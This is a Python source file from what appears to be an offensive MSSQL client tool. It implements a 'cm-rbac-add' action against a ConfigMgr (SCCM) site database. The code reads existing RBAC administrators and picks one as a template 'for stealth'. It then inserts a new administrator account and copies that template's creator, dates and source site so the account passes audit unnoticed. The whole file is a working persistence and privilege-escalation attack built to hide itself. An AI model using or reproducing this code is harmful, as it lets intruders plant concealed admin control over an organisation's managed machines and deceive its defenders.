# mssqlclient_ng/core/actions/configmgr/cm_rbac_add.py

"""Create a stealthy RBAC admin in ConfigMgr."""

from typing import Optional

from loguru import logger

from .cm_base import CMBaseAction
from ..base import Arg
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...services.configmgr import CMService


@ActionFactory.register(
    "cm-rbac-add",
    "Create a stealthy RBAC admin in ConfigMgr",
    aliases=["cm-admin-add"],
)
class CMRbacAdd(CMBaseAction):
    """
    Create a stealthy RBAC admin by mimicking an existing admin's attributes.
    Queries existing admins, selects a template, and creates a new admin with matching patterns.
    """

    _account_name: str = Arg(position=0, required=True, description="Account to add as CM admin (DOMAIN\\user)")  # type: ignore[assignment]

    def __init__(self):
        super().__init__()
        self._account_name: str = ""

    def validate_arguments(self, additional_arguments: str = "") -> None:
        named, positional = self._parse_action_arguments(additional_arguments)
        self._account_name = self.get_positional_argument(positional, 0, "")
        if not self._account_name:
            raise ValueError(
                "Account name is required. Usage: cm-rbac-add <domain\\\\user>"
            )

    def execute(self, database_context: DatabaseContext) -> Optional[list]:
        logger.info(f"Creating stealthy RBAC admin: {self._account_name}")

        databases = self._get_databases(database_context)
        if not databases:
            return None

        for db in databases:
            site_code = CMService.get_site_code(db)
            logger.info(f"ConfigMgr database: {db} (Site Code: {site_code})")

            # Query existing RBAC admins (users only)
            query = f"""
SELECT TOP 10
    AdminID, AdminSID, LogonName, IsGroup, IsDeleted,
    CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite
FROM [{db}].dbo.RBAC_Admins
WHERE IsDeleted = 0 AND IsGroup = 0
ORDER BY CreatedDate DESC;"""

            try:
                existing_admins = database_context.query_service.execute(query)
                if not existing_admins:
                    logger.error("No existing RBAC user admins found to mimic")
                    return None

                # Select template admin (prefer middle entry for stealth)
                template_idx = (
                    2 if len(existing_admins) >= 5 else len(existing_admins) // 2
                )
                template = existing_admins[template_idx]

                logger.info(
                    f"  Using template: {template.get('LogonName')} (entry {template_idx + 1} of {len(existing_admins)})"
                )

                # Insert new admin mimicking template
                insert_query = f"""
INSERT INTO [{db}].dbo.RBAC_Admins (
    AdminSID, LogonName, IsGroup, IsDeleted,
    CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite
)
VALUES (
    SUSER_SID('{self._account_name}'),
    '{self._account_name}',
    0, 0,
    '{str(template.get("CreatedBy", ""))}',
    '{str(template.get("CreatedDate", ""))}',
    '{str(template.get("ModifiedBy", ""))}',
    '{str(template.get("ModifiedDate", ""))}',
    '{str(template.get("SourceSite", ""))}'
);"""

                rows_affected = database_context.query_service.execute_non_processing(
                    insert_query
                )
                if rows_affected and rows_affected > 0:
                    logger.success("RBAC admin created successfully")
                    logger.info(f"  Account: {self._account_name}")
                    logger.info(f"  CreatedBy: {template.get('CreatedBy')}")
                    logger.info(f"  CreatedDate: {template.get('CreatedDate')}")
                else:
                    logger.error("Failed to create admin (no rows inserted)")

                return None

            except Exception as ex:
                logger.error(f"Failed to create RBAC admin: {ex}")

        return None
